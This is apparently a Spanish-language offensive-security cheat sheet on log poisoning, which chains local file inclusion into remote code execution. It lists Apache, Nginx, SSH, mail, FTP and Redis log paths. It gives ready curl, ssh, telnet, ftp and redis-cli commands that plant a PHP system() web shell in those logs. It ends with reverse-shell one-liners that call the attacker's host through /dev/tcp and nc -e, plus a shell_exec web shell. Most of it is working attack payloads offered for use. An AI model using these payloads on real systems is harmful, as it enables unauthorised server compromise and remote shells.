## 📚 **Índice 

- [[#🧠 Concepto general]]
- [[#🗂️ 1. Qué logs se pueden envenenar]]
    - [[#1.1 Web servers]]
        - [[#Apache]]
        - [[#Nginx]]
    - [[#1.2 Autenticación]]
    - [[#1.3 Servicios múltiples]]
        - [[#FTP]]
        - [[#SMTP / Email]]
        - [[#SSH]]
    - [[#1.4 PHP-FPM / Sockets]]
    - [[#1.5 Servicios raros pero útiles]]
- [[#🔍 2. Cómo detectar que puedes usar Log Poisoning]]
- [[#🧨 3. Envenenamiento de logs (inyección)]]
    - [[#3.1 Apache / Nginx vía User-Agent]]
    - [[#3.2 Apache vía Referer]]
    - [[#3.3 Apache vía URI]]
    - [[#3.4 SSH → auth.log / secure / btmp]]
    - [[#3.5 SMTP (mail.log / maillog / postfix)]]
    - [[#3.6 FTP (vsftpd / proftpd)]]
    - [[#3.7 MySQL / Redis / otros servicios]]
- [[#🧭 6. Procedimiento General Paso a Paso]]
- [[#♻️ 7. Variante: LFI → SSH → RCE (sin web logs)]]
- [[#📌 8. Tips profesionales (los que dominan la diferencia)]]




---
# 🧠 **Concepto general**

```
[LFI] → [Acceso a logs] → [Inyecto PHP en el log] → [Incluyo el log] → [RCE]
```

Ejemplo clásico:

```
?page=/var/log/apache2/access.log&cmd=id
```

Si el log contiene:

```php
<?php system($_GET['cmd']); ?>
```

Obtienes ejecución de comandos.

---

# 🗂️ **1. Qué logs se pueden envenenar**

## **1.1 Web servers**

### Apache

- `/var/log/apache2/access.log`
    
- `/var/log/apache2/error.log`
    

### Nginx

- `/var/log/nginx/access.log`
    
- `/var/log/nginx/error.log`
    

## **1.2 Autenticación**

- `/var/log/auth.log`
    
- `/var/log/secure` (RedHat/CentOS)
    
- `/var/log/btmp`
    
- `/var/log/wtmp`
    
- `/var/log/lastlog`
    

## **1.3 Servicios múltiples**

### FTP

- `/var/log/vsftpd.log`
    
- `/var/log/proftpd/proftpd.log`
    
- `/var/log/xferlog`
    

### SMTP / Email

- `/var/log/mail.log`
    
- `/var/log/maillog`
    
- `/var/log/exim/mainlog`
    
- `/var/log/postfix/smtpd`
    
- `/var/log/sendmail.st`
    

### SSH

- `/var/log/auth.log`
    
- `/var/log/btmp` (Credenciales fallidas en sistemas RedHat)
    
- `/var/log/secure`
    

## **1.4 PHP-FPM / Sockets**

- `/var/log/php7.4-fpm.log`
    
- `/var/log/php8.2-fpm.log`  
    Si el servidor loguea headers → **inyección posible**.
    

## **1.5 Servicios raros pero útiles**

- `/var/log/openvpn.log`
    
- `/var/log/mysql/error.log`
    
- `/var/log/redis/redis-server.log`
    

---

---

# 🔍 **2. Cómo detectar que puedes usar Log Poisoning**

## ✔️ Condición #1: Tienes un LFI real

## ✔️ Condición #2: Puedes leer logs accesibles

Empieza a probar:

```
?page=/var/log/apache2/access.log
?page=/var/log/auth.log
?page=/var/log/secure
?page=/var/log/mail.log
```

## ✔️ Condición #3: Los logs contienen **tu input**

Revisa si tu User-Agent, IP o nombre de usuario SSH aparece en el archivo.

---

---

# 🧨 **3. Envenenamiento de logs (inyección)**

## **3.1 Apache / Nginx vía User-Agent**

### Injectar código PHP:

```
curl -s -X GET "http://target" \
 -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

### Ejecutar:

```
?page=/var/log/apache2/access.log&cmd=id
```

## **3.2 Apache vía Referer**

```
curl -s http://target \
 -H "Referer: <?php system(\$_GET['cmd']); ?>"
```

## **3.3 Apache vía URI**

```
curl "http://target/<?php system(\$_GET['cmd']); ?>"
```

Algunos servidores loguean la ruta completa.

---

---

# 🔐 **3.4 SSH → auth.log / secure / btmp**

SSH registra intentos fallidos con el usuario:

**Payload:**

```
ssh '<?php system($_GET["cmd"]); ?>'@TARGETIP
```

Luego:

```
?page=/var/log/auth.log&cmd=id
```

En RedHat:

```
?page=/var/log/secure&cmd=id
```

Si falla pero aparece:

```
?page=/var/log/btmp&cmd=id
```

---

---

# 📮 **3.5 SMTP (mail.log / maillog / postfix)**

### Inject via MAIL FROM

```
telnet target 25
HELO x
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: admin@target
DATA
hola
.
QUIT
```

Ver si aparece:

```
?page=/var/log/mail.log&cmd=id
```

---

---

# 🎧 **3.6 FTP (vsftpd / proftpd)**

FTP loguea el nombre del usuario:

```
ftp target
Name: <?php system($_GET['cmd']); ?>
Password: whatever
```

Luego:

```
?page=/var/log/vsftpd.log&cmd=id
```

---

---

# ❗ **3.7 MySQL / Redis / otros servicios**

Poco común pero útil.

### Redis:

```
redis-cli -h target set "<?php system($_GET['cmd']); ?>" X
```

Muchos setups guardan logs en texto.

```
?page=/var/log/redis/redis-server.log&cmd=id
```

---

---


---

# 🧭 **6. Procedimiento General Paso a Paso**

## **Paso 1 — Enumerar rutas**

```
/etc/passwd
/proc/self/environ
/var/log/apache2/access.log
/var/log/auth.log
```

## **Paso 2 — Confirmar LFI**

```
?page=../../../../etc/passwd
```

## **Paso 3 — Leer logs y buscar tu input**

Haz request con User-Agent personalizado:

```
User-Agent: AAAA_TEST_1234
```

Luego mira el log vía LFI.

## **Paso 4 — Envenenar**

Inyecta PHP:

```
<?php system($_GET['cmd']); ?>
```

## **Paso 5 — Incluir el archivo envenenado**

```
?page=/var/log/apache2/access.log&cmd=id
```

## **Paso 6 — Escalar**

Reverse shell:

```
cmd=/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/443 0>&1'
```

---

---

# ♻️ **7. Variante: LFI → SSH → RCE (sin web logs)**

### 1. Envenenar auth.log con usuario malicioso

```
ssh '<?php system($_GET["cmd"]); ?>'@victima
```

Falla → pero escribe en auth.log.

### 2. Ejecutar

```
?page=/var/log/auth.log&cmd=id
```

### 3. Reverse shell

```
?page=/var/log/auth.log&cmd=nc -e /bin/bash TUIP 4444
```

---

---

# 📌 **8. Tips profesionales (los que dominan la diferencia)**

- Apache suele truncar líneas largas → usa payloads cortos.
    
- Nginx a veces sanitiza headers → prueba Referer y X-Forwarded-For.
    
- auth.log → registra _todo_ lo que metas en el usuario.
    
- btmp está en binario → a veces hay que usar `strings`.
    
- Algunos clientes SSH no permiten caracteres especiales → usa comillas simples y dobles inteligentemente.
    
- En SMTP el payload se registra literal en MAIL FROM.
    
- vsftpd registra nombres de usuario completos.
    
- Algunos logs rotan → revisa `log.1` o `.gz`.
    

---
 inyectar shell reverse con php
 ```
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```


# 🧠 ** Diferencias técnicas REALES en reverse shell**

|Aspecto|`shell_exec()`|`system()`|
|---|---|---|
|Retorna salida|Sí (string completo)|No (imprime en tiempo real)|
|Imprime salida|Solo si tú la haces `echo`|Automáticamente|
|Captura stderr|No|A veces sí (dependiendo del SAPI)|
|Velocidad|Más lento|Más rápido|
|Ideal para|Exfiltrar, ocultar ejecución|Debug, interacción inmediata|
|Reverse Shell|Funciona|Funciona (mejor feedback)|
|Superficie entrada|GET/POST/COOKIE|Solo GET|
